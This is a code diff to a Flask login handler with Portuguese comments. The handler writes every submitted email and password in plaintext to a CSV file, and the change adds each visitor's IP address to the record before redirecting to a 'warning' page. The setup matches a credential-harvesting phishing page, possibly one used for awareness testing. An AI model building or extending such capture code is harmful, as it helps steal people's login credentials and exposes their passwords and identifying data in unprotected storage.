@@ -9,11 +9,12 @@ def login():
     if request.method == "POST":
         email = request.form.get("email")
         password = request.form.get("password")
+        ip = request.remote_addr  # Capturar o endereço IP do cliente
 
         # Guardar os dados no ficheiro CSV
         with open("registos.csv", mode="a", newline="", encoding="utf-8") as file:
             writer = csv.writer(file)
-            writer.writerow([datetime.now(), email, password])
+            writer.writerow([datetime.now(), email, password, ip])  # Adicionar o IP ao registo
 
         # Redireciona para a página de aviso
         return redirect(url_for("aviso"))
